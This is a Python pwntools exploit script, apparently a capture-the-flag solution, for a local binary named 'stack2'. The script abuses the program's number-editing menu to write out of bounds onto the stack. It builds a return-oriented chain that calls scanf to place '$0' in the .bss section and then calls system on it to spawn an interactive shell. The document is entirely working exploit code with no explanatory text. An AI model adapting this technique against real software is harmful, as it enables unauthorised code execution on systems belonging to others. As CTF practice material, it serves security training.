from pwn import *

fpath = "./stack2"
# context.log_level = "debug"
offset = 0x70 + 0x14

p = process("./stack2")
elf = ELF(fpath)

p.sendlineafter("have:" , "1")
p.sendlineafter("Give me your numbers\n" , "1")

bss   = elf.symbols["__bss_start"]
addr_d = 0x8048A97
scanf =  elf.plt["__isoc99_scanf"]
system = elf.plt["system"]
p2p_r    = 0x0804895a

def edit(idx , num):
	p.sendlineafter("exit\n" , "3")
	p.recvuntil(":")
	p.sendline(str(idx))
	p.recvuntil(":")
	p.sendline(str(num))

def edit_num(num , start_offset):
	num = p32(num)
	for i in range(4):
		edit(start_offset + i , ord(num[i]) )

# temp = "/bin/sh\x00"
# temp = "sh\x00"
temp = "$0"
for i in range(len(temp)):
	edit_num(scanf , offset + i * 0x10)
	edit_num(p2p_r , offset + 4 + i * 0x10)
	edit_num(addr_d , offset + 8 + i * 0x10)
	edit_num(bss + i , offset + 0xc + i * 0x10)
edit_num(system , offset  + len(temp) * 0x10 )
edit_num(0 , offset + len(temp) * 0x10 + 4)
edit_num(bss  , offset + len(temp) * 0x10 + 8)
# edit_num(system , offset)
# edit_num(0x08048980 + 7 , offset + 8)
p.recvuntil("exit\n")
# gdb.attach(p , "b *0x80488EE")
p.sendline("5")
for i in temp:
	p.sendline(str(ord(i)))

p.interactive()
